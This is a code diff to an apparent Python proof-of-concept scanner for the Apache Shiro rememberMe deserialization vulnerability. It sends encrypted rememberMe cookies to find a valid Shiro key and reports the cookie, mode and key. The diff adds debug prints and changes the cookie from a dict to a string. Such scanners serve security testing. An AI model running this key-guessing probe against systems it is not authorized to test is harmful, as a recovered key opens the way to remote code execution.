@@ -44,11 +44,13 @@ class Poc(threading.Thread):
     def run(self):
         try:
             encrypt = getattr(self, self.mode + "_encrypt")
-            self.cookies = {"rememberMe": encrypt(self.key)}
+            self.cookies = "rememberMe=%s" % encrypt(self.key)
             resp = requestUtil.get(self.url, cookies=self.cookies)
+            print(resp.headers)
             if not "rememberme" in str(resp.headers).lower():
                 self.result = True
-        except:
+        except Exception as e:
+            print(e)
             pass
 
     def get_results(self):
@@ -62,6 +64,7 @@ def fingerprint(service):
             if "rememberme" in str(resp.headers).lower():
                 return True
         except Exception as e:
+            print(e)
             return False
 
 
@@ -79,9 +82,10 @@ def poc(service):
         for s in shiro_list:
             s.join()
         for s in shiro_list:
+            r = s.get_results()
             if s.get_results():
                 return ["shiro反序列化漏洞",
-                        "Cookie：rememberMe=%s...<br>Mode：%s<br>Key：%s" % (s.cookies["rememberMe"][:10], s.mode, s.key)]
+                        "Cookie：rememberMe=%s...<br>Mode：%s<br>Key：%s" % (s.cookies.replace("rememberMe=", "")[:10], s.mode, s.key)]
         return ["存在shiro框架", "Cookie：rememberMe=1", "success"]
 
     result_cbc = test("cbc")
